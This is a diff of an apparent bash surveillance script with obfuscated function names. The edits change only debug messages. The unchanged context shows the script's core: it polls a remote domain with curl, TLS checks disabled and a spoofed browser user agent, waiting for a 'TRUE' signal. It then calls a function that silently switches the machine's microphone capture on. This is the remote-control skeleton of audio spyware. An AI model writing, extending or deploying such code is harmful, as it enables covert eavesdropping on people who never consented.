@@ -24,7 +24,7 @@ function Mcx(){
 	microphone_status=$(amixer get Capture | grep "\[on\]")
  	#
 	if [[ -n $microphone_status ]]; then
-	    dbgx "ax... Mcx...Okx..."
+	    dbgx "Mcx: Okx..."
      	    #cx_ "ax... Mcx...Okx..." "PX"
 	else
 	    amixer set Capture toggle
@@ -187,7 +187,7 @@ function px(){
     px_OX=`curl -k -H "User-Agent: Mozilla XYZ" https://www.kdates.co.ke/HW1970/px`
     if [[ "$px_OX" == "TRUE" ]]
     then
-        dbgx "Run: $px_OX";
+        dbgx "px...Run: $px_OX";
   	#
  	Mcx
   	#
@@ -201,7 +201,7 @@ function px(){
 	#
 	exit 0
     else
-        dbgx "Run: $px_OX";
+        dbgx "px...Run: $px_OX";
         exit 1
     fi
 }
